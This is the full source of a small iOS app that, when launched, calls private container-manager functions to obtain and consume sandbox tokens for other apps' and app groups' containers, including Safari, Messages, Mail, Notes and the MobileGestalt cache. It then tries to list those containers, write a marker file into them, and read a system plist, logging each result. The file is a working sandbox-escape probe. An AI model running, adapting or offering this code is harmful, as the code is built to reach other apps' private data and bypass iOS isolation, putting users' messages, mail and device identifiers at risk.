// sbhouse — MobileHouseArrest identity probe: query other apps' containers.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_ids, q_group_ids;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static FILE *gLog;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbhouse] %@", s);
    if (gLog) { fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); }
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen fail"); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_ids = (fn_set_obj)dlsym(h, "container_query_set_identifiers");
    q_group_ids = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    L(@"load q=%p get=%p tok=%p consume=%p", q_create, q_get, q_token, s_consume);
    return q_create && q_get && q_token && s_consume;
}

static const char *pathFromToken(const char *tok) {
    const char *p = strrchr(tok, ';');
    return p ? p + 1 : "";
}

static void probe(NSString *label, uint64_t cls, NSString *ident, BOOL group, uint64_t part, uint64_t flags) {
    void *q = q_create();
    q_class(q, cls);
    void *x = xpc_string ? xpc_string(ident.UTF8String) : NULL;
    if (group) { if (q_group_ids) q_group_ids(q, x); }
    else { if (q_ids) q_ids(q, x); }
    q_part(q, part);
    q_flags(q, flags);
    void *res = q_get(q);
    char *tok = (res && q_token) ? q_token(res) : NULL;
    const char *tp = tok ? pathFromToken(tok) : "";
    L(@"[%@] cls=%llu group=%d part=%llu flags=0x%llx res=%p tok=%s path=%s",
      label, (unsigned long long)cls, group, (unsigned long long)part,
      (unsigned long long)flags, res, tok ? "YES" : "NO", tp);
    if (tok) {
        int64_t h = s_consume(tok);
        L(@"[%@] consume=%lld", label, (long long)h);
        if (h >= 0) {
            NSString *p = [NSString stringWithUTF8String:tp];
            if (p.length) {
                errno = 0; DIR *d = opendir(p.fileSystemRepresentation);
                L(@"[%@] opendir %@ -> %p errno=%d", label, p, d, errno);
                if (d) closedir(d);
                NSString *m = [p stringByAppendingPathComponent:@"sbhouse_marker"];
                errno = 0; int fd = open(m.fileSystemRepresentation, O_CREAT|O_WRONLY|O_TRUNC, 0644);
                L(@"[%@] write %@ -> %d errno=%d", label, m, fd, errno);
                if (fd >= 0) { write(fd,"x",1); close(fd); unlink(m.fileSystemRepresentation); }
                NSString *mp = [p stringByAppendingPathComponent:@"Library/Caches/com.apple.MobileGestalt.plist"];
                errno = 0; int rfd = open(mp.fileSystemRepresentation, O_RDONLY);
                L(@"[%@] read MG plist %@ -> %d errno=%d", label, mp, rfd, errno);
                if (rfd >= 0) close(rfd);
            }
            s_release(h);
        }
        free(tok);
    }
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
}

static void runProbe(void) {
    @autoreleasepool {
        NSString *home = NSHomeDirectory();
        gLog = fopen([home stringByAppendingPathComponent:@"Documents/sbhouse.log"].fileSystemRepresentation, "w");
        L(@"=== sbhouse start pid=%d bundle=%@", getpid(), [[NSBundle mainBundle] bundleIdentifier]);
        if (!load()) return;
        NSArray<NSString *> *apps = @[@"com.apple.Preferences", @"com.apple.mobilesafari",
            @"com.apple.mobilenotes", @"com.apple.geod", @"com.apple.PosterBoard",
            @"com.apple.MobileSMS", @"com.apple.mobilemail", @"app.lake9674.aquila8809"];
        for (NSString *a in apps) {
            for (uint64_t part = 0; part <= 3; part += 3) {
                probe([NSString stringWithFormat:@"app2-%@", a], 2, a, NO, part, 0x900000000ULL);
            }
        }
        NSArray<NSString *> *groups = @[@"group.com.apple.notes", @"group.com.apple.mobilegestaltcache",
            @"group.8e0bc870a21520b9.1", @"group.com.apple.stocks", @"group.com.apple.news"];
        for (NSString *g in groups) {
            for (uint64_t part = 0; part <= 3; part += 3) {
                probe([NSString stringWithFormat:@"grp7-%@", g], 7, g, YES, part, 0x900000000ULL);
            }
        }
        probe(@"mg13", 13, @"systemgroup.com.apple.mobilegestaltcache", YES, 3, 0x8100000000ULL);
        L(@"=== sbhouse done ===");
        if (gLog) { fclose(gLog); gLog = NULL; }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbhouse"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
